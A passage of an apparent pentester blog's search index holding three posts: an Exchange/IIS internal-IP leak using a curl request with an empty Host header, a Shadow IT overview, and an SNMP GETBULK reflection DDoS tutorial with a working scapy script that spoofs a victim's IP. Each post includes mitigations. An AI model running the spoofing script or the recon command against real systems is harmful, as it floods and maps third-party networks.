response would include some juicy internal information\u2014specifically, the private IP address of the server, neatly tucked away in the WWW-Authenticate realm header .","title":"The Setup: IIS 10.0, HTTP/1.0, and a Misconfigured Host Header"},{"location":"MsExchangeInfoDisclosure/#the-elite-exploit-aka-running-curl","text":"This is one of those exploits where you don\u2019t need a fancy zero-day or an obscure Python script. Nope, just some good old curl : curl -X GET http://target.com/owa/ -H \"Host:\" --http1.0 -i","title":"The \"Elite\" Exploit (a.k.a. Running Curl)"},{"location":"MsExchangeInfoDisclosure/#expected-response","text":"HTTP/1.1 401 Unauthorized WWW-Authenticate: Negotiate WWW-Authenticate: NTLM realm=\"192.168.1.50\" Oh no, Exchange! You weren\u2019t supposed to tell me that!","title":"Expected Response:"},{"location":"MsExchangeInfoDisclosure/#why-this-works-exchange-iis-being-helpful","text":"By default, Exchange CAS servers running on IIS 10.0 love to respond to authentication requests in a way that includes the internal realm. Normally, this isn\u2019t an issue\u2014unless, of course, someone forgot to properly configure the headers and now every unauthenticated request leaks the internal network structure . And let\u2019s be honest: most admins are too busy fighting Outlook issues to bother with security headers.","title":"Why This Works: Exchange + IIS Being \"Helpful\""},{"location":"MsExchangeInfoDisclosure/#the-why-should-you-care-section","text":"What can an attacker do with an internal IP? Well, for starters: - Refine attack paths: Knowing the internal structure makes pivoting much easier. - Bypass some poorly configured security policies: If there's a split-tunnel VPN or weak firewall rules, this can be gold. - Social engineering fuel: \"Oh hey, IT helpdesk? Yeah, I\u2019m calling from 192.168.1.50, we got a problem...\" NGL, I lacked some inspiration on that one","title":"The \"Why Should You Care?\" Section"},{"location":"MsExchangeInfoDisclosure/#how-to-fix-this-if-youre-an-admin-and-now-panicking","text":"Luckily, this one\u2019s an easy fix (assuming you don\u2019t ignore it like that pile of pending updates on your test server): Disable NTLM authentication over HTTP (force it over HTTPS) Set up proper response headers to avoid leaking internal details Use a reverse proxy or WAF to filter and block HTTP/1.0 requests Audit Exchange CAS configurations (because this probably isn\u2019t the only issue)","title":"How to Fix This (If You\u2019re an Admin and Now Panicking)"},{"location":"MsExchangeInfoDisclosure/#final-thoughts","text":"It\u2019s 2025, and Microsoft Exchange is still finding new ways to embarrass itself. But hey, if you\u2019re a pentester, it\u2019s free recon with minimal effort\u2014so thanks, Exchange, for making external engagements just a little bit easier. \ud83c\udf89 Next Up: \"From Directory Listing to Webshell to Domain Admin\u2014Because Why Make It Hard?\"","title":"Final Thoughts"},{"location":"shadowIT/","text":"\u2601\ufe0f Shadow IT: The Hidden Risks Lurking in Your Network Introduction Ah, Shadow IT \u2014the bane of every security team\u2019s existence. You lock down everything, enforce strict policies, and yet, someone in marketing still decides to spin up a Dropbox account to \u201cmake collaboration easier.\u201d Congratulations, your data is now one misconfiguration away from public exposure. \ud83c\udf89 Today, we\u2019ll cover: 1. What Shadow IT is and why it\u2019s a nightmare. 2. How attackers exploit it during a penetration test. 3. A real-world example of an actual breach caused by unauthorized services. 4. How to hunt for Shadow IT in your own network before the bad guys do. What is Shadow IT? Shadow IT refers to unauthorized hardware, software, or cloud services used by employees without the approval (or knowledge) of the IT department. Examples include: - Personal Dropbox, Google Drive, or OneDrive accounts. - Employees running unauthorized web servers on company hardware. - Using third-party email services to bypass company filters. - Self-hosted VPNs or proxies for unrestricted internet access. \ud83d\udea8 Why is this a problem? \ud83d\udea8 - Data Loss & Exposure \u2013 Unsecured storage can leak sensitive information. - No Security Patching \u2013 IT teams can\u2019t protect what they don\u2019t know exists. - Regulatory Compliance Violations \u2013 Data stored outside approved environments can get companies fined. How Attackers Exploit Shadow IT From a pentester\u2019s perspective, Shadow IT is free real estate . If an employee deploys an unauthorized system, odds are: 1. It has weak authentication (or none at all). 2. It\u2019s not being monitored. 3. It exposes internal services to the internet. During a pentest, here\u2019s what we look for: - Cloud storage leaks : Employees syncing company data to personal Dropbox or Google Drive accounts. - Unauthorized web servers : We find forgotten Jenkins, phpMyAdmin, or Nextcloud instances running on high-numbered ports. - Exposed development environments : Test servers often run outdated software and have default credentials. Real-World Example: Shadow IT in Action A financial institution we assessed had a strict no-cloud-storage policy. Except, as it turns out, that policy didn\u2019t stop a department from using a personal OneDrive account to share sensitive Excel spreadsheets. What we found: One employee used their personal email to create a OneDrive account . A script automatically synced customer data to OneDrive every night. The account had no multi-factor authentication (MFA). The credentials were leaked in a previous data breach (thanks, HaveIBeenPwned). Result? Attackers accessed customer financial records via the exposed OneDrive. The company suffered regulatory fines and legal action. How to Detect & Eliminate Shadow IT Want to stay ahead of the game? Here\u2019s how to hunt for rogue IT services: \ud83d\udd0d Monitor Outbound Traffic - Use firewall rules to detect connections to unauthorized cloud services. - Look for DNS requests to file-sharing platforms. \ud83d\udd0d Conduct Regular Asset Discovery - Use nmap, Shodan, or internal scans to find unapproved services. - Regularly audit cloud service usage via Microsoft 365, AWS, or Google Workspace logs. \ud83d\udd0d Educate Employees - Explain why Shadow IT is risky. If users know why it's dangerous, they might stop doing it (wishful thinking, but still). - Provide approved alternatives that are secure and user-friendly. Conclusion Shadow IT isn\u2019t just a minor inconvenience\u2014it\u2019s a massive security risk. Unauthorized services bypass security controls , expose sensitive data , and make incident response nearly impossible. Want to keep your network secure? Find and eliminate Shadow IT before attackers do. Because nothing says \u201cI care about security\u201d like not letting employees run their own rogue IT department. \ud83d\ude09 \ud83d\udcac Thoughts? Have you encountered Shadow IT nightmares during a pentest? Drop your stories below!","title":"Shadow IT"},{"location":"shadowIT/#shadow-it-the-hidden-risks-lurking-in-your-network","text":"","title":"\u2601\ufe0f Shadow IT: The Hidden Risks Lurking in Your Network"},{"location":"shadowIT/#introduction","text":"Ah, Shadow IT \u2014the bane of every security team\u2019s existence. You lock down everything, enforce strict policies, and yet, someone in marketing still decides to spin up a Dropbox account to \u201cmake collaboration easier.\u201d Congratulations, your data is now one misconfiguration away from public exposure. \ud83c\udf89 Today, we\u2019ll cover: 1. What Shadow IT is and why it\u2019s a nightmare. 2. How attackers exploit it during a penetration test. 3. A real-world example of an actual breach caused by unauthorized services. 4. How to hunt for Shadow IT in your own network before the bad guys do.","title":"Introduction"},{"location":"shadowIT/#what-is-shadow-it","text":"Shadow IT refers to unauthorized hardware, software, or cloud services used by employees without the approval (or knowledge) of the IT department. Examples include: - Personal Dropbox, Google Drive, or OneDrive accounts. - Employees running unauthorized web servers on company hardware. - Using third-party email services to bypass company filters. - Self-hosted VPNs or proxies for unrestricted internet access. \ud83d\udea8 Why is this a problem? \ud83d\udea8 - Data Loss & Exposure \u2013 Unsecured storage can leak sensitive information. - No Security Patching \u2013 IT teams can\u2019t protect what they don\u2019t know exists. - Regulatory Compliance Violations \u2013 Data stored outside approved environments can get companies fined.","title":"What is Shadow IT?"},{"location":"shadowIT/#how-attackers-exploit-shadow-it","text":"From a pentester\u2019s perspective, Shadow IT is free real estate . If an employee deploys an unauthorized system, odds are: 1. It has weak authentication (or none at all). 2. It\u2019s not being monitored. 3. It exposes internal services to the internet. During a pentest, here\u2019s what we look for: - Cloud storage leaks : Employees syncing company data to personal Dropbox or Google Drive accounts. - Unauthorized web servers : We find forgotten Jenkins, phpMyAdmin, or Nextcloud instances running on high-numbered ports. - Exposed development environments : Test servers often run outdated software and have default credentials.","title":"How Attackers Exploit Shadow IT"},{"location":"shadowIT/#real-world-example-shadow-it-in-action","text":"A financial institution we assessed had a strict no-cloud-storage policy. Except, as it turns out, that policy didn\u2019t stop a department from using a personal OneDrive account to share sensitive Excel spreadsheets.","title":"Real-World Example: Shadow IT in Action"},{"location":"shadowIT/#what-we-found","text":"One employee used their personal email to create a OneDrive account . A script automatically synced customer data to OneDrive every night. The account had no multi-factor authentication (MFA). The credentials were leaked in a previous data breach (thanks, HaveIBeenPwned).","title":"What we found:"},{"location":"shadowIT/#result","text":"Attackers accessed customer financial records via the exposed OneDrive. The company suffered regulatory fines and legal action.","title":"Result?"},{"location":"shadowIT/#how-to-detect-eliminate-shadow-it","text":"Want to stay ahead of the game? Here\u2019s how to hunt for rogue IT services: \ud83d\udd0d Monitor Outbound Traffic - Use firewall rules to detect connections to unauthorized cloud services. - Look for DNS requests to file-sharing platforms. \ud83d\udd0d Conduct Regular Asset Discovery - Use nmap, Shodan, or internal scans to find unapproved services. - Regularly audit cloud service usage via Microsoft 365, AWS, or Google Workspace logs. \ud83d\udd0d Educate Employees - Explain why Shadow IT is risky. If users know why it's dangerous, they might stop doing it (wishful thinking, but still). - Provide approved alternatives that are secure and user-friendly.","title":"How to Detect &amp; Eliminate Shadow IT"},{"location":"shadowIT/#conclusion","text":"Shadow IT isn\u2019t just a minor inconvenience\u2014it\u2019s a massive security risk. Unauthorized services bypass security controls , expose sensitive data , and make incident response nearly impossible. Want to keep your network secure? Find and eliminate Shadow IT before attackers do. Because nothing says \u201cI care about security\u201d like not letting employees run their own rogue IT department. \ud83d\ude09 \ud83d\udcac Thoughts? Have you encountered Shadow IT nightmares during a pentest? Drop your stories below!","title":"Conclusion"},{"location":"snmpGetBulk/","text":"\ud83d\ude80 SNMP 'GETBULK' Reflection DDoS \u2013 Weaponizing Network Services Introduction Ever heard of SNMP GETBULK? If not, congratulations on not being a network engineer. If yes, then you probably know that Simple Network Management Protocol (SNMP) is supposed to make life easier\u2014but surprise! It can also be used to wreak havoc on networks through reflection-based DDoS attacks . Today, we\u2019ll explore: 1. How SNMP 'GETBULK' works (for those who don\u2019t love reading RFCs for fun). 2. How attackers abuse it for DDoS reflection (because of course they do). 3. How to simulate the attack (for educational purposes , obviously). 4. How to prevent your network from being an unwilling accomplice (unless you want to be a botnet). How SNMP 'GETBULK' Works SNMP is typically used for network monitoring, allowing admins to query devices for status updates. The GETBULK request is part of SNMPv2 and is meant to efficiently retrieve large amounts of data at once (because who wants to send multiple small queries?). A typical GETBULK request structure looks like this: Field Description Version SNMP version (usually v2c for bulk requests) Community Shared secret (default: 'public', because why not?) PDU Type GETBULKREQUEST identifier Request ID Unique identifier for the request NonRepeaters Number of single-instance variables to retrieve MaxRepetitions How many values to return (can be abused) Variable Bindings List of OIDs (Object Identifiers) being queried Normally, this helps network admins get bulk data efficiently. But guess what? Attackers don\u2019t care about efficiency\u2014they care about bandwidth amplification. How SNMP 'GETBULK' Becomes a DDoS Amplification Tool Reflection DDoS attacks work by spoofing the source IP address of requests, making a victim think they\u2019re receiving replies from legitimate sources. SNMP GETBULK is perfect for this because: The attacker sends a small query to an SNMP-enabled device. The device sends back a massive response to the spoofed IP (the victim). Multiply this by thousands of devices, and suddenly, the victim\u2019s network is drowning in data. \ud83d\udca1 Amplification factor: Depending on how misconfigured (or helpful ) the SNMP device is, the response can be up to 100x the original request size. That\u2019s free bandwidth for attackers and bad news for targets. Python Script to Simulate a GETBULK Reflection Attack Want to see it in action? Here\u2019s a simple Python script that sends SNMP GETBULK requests to an open SNMP server while spoofing the victim\u2019s IP. (Obviously, use responsibly.) from scapy.all import * import random # Target SNMP server (reflector) and victim REFLECTOR_IP = \"192.168.1.100\" # Change this to an open SNMP server VICTIM_IP = \"203.0.113.50\" # Change this to your victim\u2019s IP SNMP_PORT = 161 # Default SNMP port # Craft an SNMP GETBULK request (basic structure) def craft_snmp_getbulk(): snmp_packet = IP(src=VICTIM_IP, dst=REFLECTOR_IP) / UDP(sport=random.randint(1024, 65535), dport=SNMP_PORT) / SNMP(version=2, community=\"public\", PDU=SNMPbulk(id=random.randint(1000, 9999), non_repeaters=0, max_repetitions=50)) return snmp_packet # Send SNMP GETBULK packets def send_reflection_attack(): print(f\"[+] Sending spoofed SNMP GETBULK requests to {REFLECTOR_IP}, victim: {VICTIM_IP}\") for _ in range(10): # Adjust for desired intensity packet = craft_snmp_getbulk() send(packet, verbose=False) print(\"[+] Packets sent!\") send_reflection_attack() Expected Outcomes If the SNMP server replies to the victim\u2019s IP with a huge response \u2192 You\u2019ve confirmed a reflection vulnerability. If nothing happens \u2192 The SNMP server might be properly secured ( shocking! ). If you accidentally crash something \u2192 Whoops. Maybe don\u2019t test this on production? Mitigation & Defense Strategies Tired of being part of a botnet? Here\u2019s how to avoid it: \u2705 Disable SNMP if you don\u2019t use it. (Seriously, most people don\u2019t even need it.) \u2705 Restrict SNMP to internal networks. (Your printer does not need to talk to the entire internet.) \u2705 Use strong SNMP community strings. (Change \u2018public\u2019 to something not guessable.) \u2705 Rate-limit SNMP responses. (Your device doesn\u2019t need to flood the internet with responses.) \u2705 Block UDP port 161 from untrusted sources. (If it\u2019s public, you\u2019re asking for trouble.) \u2705 Upgrade to SNMPv3 with authentication. (SNMPv2c is basically an open bar for attackers.) Conclusion SNMP 'GETBULK' is a great tool for network management\u2014until it isn\u2019t. With a 100x amplification factor , it\u2019s a favorite among DDoS attackers looking to overwhelm targets with reflected traffic. The good news? A few simple security measures can prevent your devices from being hijacked into a botnet. So lock it down before someone turns your innocent network printer into a DDoS cannon. \ud83d\udd25 \ud83d\udd39 Want to see more network exploitation techniques? Stay tuned for upcoming posts! \ud83d\ude80 \ud83d\udcac Got thoughts or questions? Drop them below, or complain to your local IT admin! \ud83d\ude09","title":"SNMP GetBulk"},{"location":"snmpGetBulk/#snmp-getbulk-reflection-ddos-weaponizing-network-services","text":"","title":"\ud83d\ude80 SNMP 'GETBULK' Reflection DDoS \u2013 Weaponizing Network Services"},{"location":"snmpGetBulk/#introduction","text":"Ever heard of SNMP GETBULK? If not, congratulations on not being a network engineer. If yes, then you probably know that Simple Network Management Protocol (SNMP) is supposed to make life easier\u2014but surprise! It can also be used to wreak havoc on networks through reflection-based DDoS attacks . Today, we\u2019ll explore: 1. How SNMP 'GETBULK' works (for those who don\u2019t love reading RFCs for fun). 2. How attackers abuse it for DDoS reflection (because of course they do). 3. How to simulate the attack (for educational purposes , obviously). 4. How to prevent your network from being an unwilling accomplice (unless you want to be a botnet).","title":"Introduction"},{"location":"snmpGetBulk/#how-snmp-getbulk-works","text":"SNMP is typically used for network monitoring, allowing admins to query devices for status updates. The GETBULK request is part of SNMPv2 and is meant to efficiently retrieve large amounts of data at once (because who wants to send multiple small queries?). A typical GETBULK request structure looks like this: Field Description Version SNMP version (usually v2c for bulk requests) Community Shared secret (default: 'public', because why not?) PDU Type GETBULKREQUEST identifier Request ID Unique identifier for the request NonRepeaters Number of single-instance variables to retrieve MaxRepetitions How many values to return (can be abused) Variable Bindings List of OIDs (Object Identifiers) being queried Normally, this helps network admins get bulk data efficiently. But guess what? Attackers don\u2019t care about efficiency\u2014they care about bandwidth amplification.","title":"How SNMP 'GETBULK' Works"},{"location":"snmpGetBulk/#how-snmp-getbulk-becomes-a-ddos-amplification-tool","text":"Reflection DDoS attacks work by spoofing the source IP address of requests, making a victim think they\u2019re receiving replies from legitimate sources. SNMP GETBULK is perfect for this because: The attacker sends a small query to an SNMP-enabled device. The device sends back a massive response to the spoofed IP (the victim). Multiply this by thousands of devices, and suddenly, the victim\u2019s network is drowning in data. \ud83d\udca1 Amplification factor: Depending on how misconfigured (or helpful ) the SNMP device is, the response can be up to 100x the original request size. That\u2019s free bandwidth for attackers and bad news for targets.","title":"How SNMP 'GETBULK' Becomes a DDoS Amplification Tool"},{"location":"snmpGetBulk/#python-script-to-simulate-a-getbulk-reflection-attack","text":"Want to see it in action? Here\u2019s a simple Python script that sends SNMP GETBULK requests to an open SNMP server while spoofing the victim\u2019s IP. (Obviously, use responsibly.) from scapy.all import * import random # Target SNMP server (reflector) and victim REFLECTOR_IP = \"192.168.1.100\" # Change this to an open SNMP server VICTIM_IP = \"203.0.113.50\" # Change this to your victim\u2019s IP SNMP_PORT = 161 # Default SNMP port # Craft an SNMP GETBULK request (basic structure) def craft_snmp_getbulk(): snmp_packet = IP(src=VICTIM_IP, dst=REFLECTOR_IP) / UDP(sport=random.randint(1024, 65535), dport=SNMP_PORT) / SNMP(version=2, community=\"public\", PDU=SNMPbulk(id=random.randint(1000, 9999), non_repeaters=0, max_repetitions=50)) return snmp_packet # Send SNMP GETBULK packets def send_reflection_attack(): print(f\"[+] Sending spoofed SNMP GETBULK requests to {REFLECTOR_IP}, victim: {VICTIM_IP}\") for _ in range(10): # Adjust for desired intensity packet = craft_snmp_getbulk() send(packet, verbose=False) print(\"[+] Packets sent!\") send_reflection_attack()","title":"Python Script to Simulate a GETBULK Reflection Attack"},{"location":"snmpGetBulk/#expected-outcomes","text":"If the SNMP server replies to the victim\u2019s IP with a huge response \u2192 You\u2019ve confirmed a reflection vulnerability. If nothing happens \u2192 The SNMP server might be properly secured ( shocking! ). If you accidentally crash something \u2192 Whoops. Maybe don\u2019t test this on production?","title":"Expected Outcomes"},{"location":"snmpGetBulk/#mitigation-defense-strategies","text":"Tired of being part of a botnet? Here\u2019s how to avoid it: \u2705 Disable SNMP if you don\u2019t use it. (Seriously, most people don\u2019t even need it.) \u2705 Restrict SNMP to internal networks. (Your printer does not need to talk to the entire internet.) \u2705 Use strong SNMP community strings. (Change \u2018public\u2019 to something not guessable.) \u2705 Rate-limit SNMP responses. (Your device doesn\u2019t need to flood the internet with responses.) \u2705 Block UDP port 161 from untrusted sources. (If it\u2019s public, you\u2019re asking for trouble.) \u2705 Upgrade to SNMPv3 with authentication. (SNMPv2c is basically an open bar for attackers.)","title":"Mitigation &amp; Defense Strategies"},{"location":"snmpGetBulk/#conclusion","text":"SNMP 'GETBULK' is a great tool for network management\u2014until it isn\u2019t. With a 100x amplification factor , it\u2019s a favorite among DDoS attackers looking to overwhelm targets with reflected traffic. The good news? A few simple security measures can prevent your devices from being hijacked into a botnet. So lock it down before someone turns your innocent network printer into a DDoS cannon. \ud83d\udd25 \ud83d\udd39 Want to see more network exploitation techniques? Stay tuned for upcoming posts! \ud83d\ude80 \ud83d\udcac Got thoughts or questions? Drop them below, or complain to your local IT admin! \ud83d\ude09","title":"Conclusion"}]}